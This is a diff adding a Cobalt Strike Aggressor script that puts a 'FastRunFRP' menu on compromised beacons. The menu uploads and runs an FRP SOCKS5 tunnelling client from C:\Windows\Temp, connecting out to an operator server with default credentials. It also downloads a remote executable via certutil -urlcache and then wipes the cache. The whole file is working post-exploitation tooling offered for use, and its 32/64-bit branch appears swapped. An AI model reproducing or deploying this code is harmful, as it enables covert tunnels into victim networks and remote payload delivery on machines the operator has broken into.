@@ -1,0 +1,68 @@
+
+sub FRP_upload {
+    ## https://www.cobaltstrike.com/aggressor-script/functions.html
+    ## http://sleep.dashnine.org/manual/
+    
+    bcd($bid, $3['UploadPath']);
+    if (-is64 $bid['id']) {
+        bupload($bid, script_resource("script/win32/client.exe"));
+    }else{
+        bupload($bid, script_resource("script/win64/client.exe"));
+    }
+    bshell($bid, $3['UploadPath']."client.exe --protocol tcp --uc --tls_enable --pg socks5 -t test.com "." -s ".$3['IP'].":".$3['PORT']." -r ".$3['PPORT']." --pgu ".$3['plugin_user']." --pgp ".$3['plugin_passwd']);
+    bnote($bid,$3['note']."-"."socks5:".$3['IP'].":".$3['PPORT'] );
+}
+
+sub FRP_RUN{
+    # show_message("Executing cmmand!");
+    # bcd($bid, $3['UploadPath']);
+
+    bshell($bid, $3['FilePath']."  tcp --uc --tls_enable  -t test.com "." -s ".$3['IP'].":".$3['PORT']." -r ".$3['PPORT']." --pgu ".$3['plugin_user']." --pgp ".$3['plugin_passwd']);
+    # bnote($bid,$note. "socks5:".$3['IP'].":".$3['PPORT']." Time: " . formatDate('yyyy-dd-MM HH:mm (z)'));
+    bnote($bid,$3['note']."-"."socks5:".$3['IP'].":".$3['PPORT'] );
+}
+
+
+
+popup beacon_bottom {
+    menu "FastRunFRP" {
+        item "Upload And Run FRP" {
+
+            $bid = $1;
+            $dialog = dialog("Upload And Run Config", %(UploadPath => "C:\\Windows\\Temp\\", IP => "127.0.0.1", PORT => "443",PPORT => "10086",plugin_user =>"admin",plugin_passwd =>"admin@123",bid => $bid), &FRP_upload);
+            drow_text($dialog, "UploadPath",  "Upload Path: "); 	
+            drow_text($dialog, "IP",  "Server IP: ");
+            drow_text($dialog, "PORT",  "Server PORT: ");
+            drow_text($dialog, "PPORT",  "Proxy PORT: ");
+            drow_text($dialog, "plugin_user",  "plugin_user:");
+            drow_text($dialog, "plugin_passwd",  "plugin_passwd: ");
+            drow_text($dialog, "note",  "note: ");
+            dbutton_action($dialog, "Upload And Run");
+            dialog_show($dialog);
+        }
+        item "Download FRP" {
+             prompt_text("默认路径C:\\Windows\\Temp\\client.exe", "", lambda({
+            bshell(@ids, "certutil & certutil -urlcache -split -f  $1 C:\\Windows\\Temp\\client.exe && certutil & certutil -urlcache -split -f  $1  delete");
+        }, @ids => $1));
+    }	
+        item "Delete FRP" {
+                bshell($1, "taskkill /f /t /im client.exe &&  del /f /s /q client.exe");
+                bnote($bid,' ')
+            }
+
+        item "RUN FRP" {
+                $bid = $1;
+                $dialog = dialog("Run FRP Config", %(FilePath => "C:\\Windows\\Temp\\client.exe", IP => "127.0.0.1", PORT => "443",PPORT => "10086",plugin_user =>"admin",plugin_passwd =>"admin@123",bid => $bid), &FRP_RUN);
+                drow_text($dialog, "FilePath",  "FilePath: "); 	
+                drow_text($dialog, "IP",  "Server IP: ");
+                drow_text($dialog, "PORT",  "Server PORT: ");
+                drow_text($dialog, "PPORT",  "Proxy PORT: ");
+                drow_text($dialog, "plugin_user",  "plugin_user:");
+                drow_text($dialog, "plugin_passwd",  "plugin_passwd: ");
+                drow_text($dialog, "note",  "note: ");
+                dbutton_action($dialog, "Run");
+                dialog_show($dialog);
+            }
+    }
+
+}
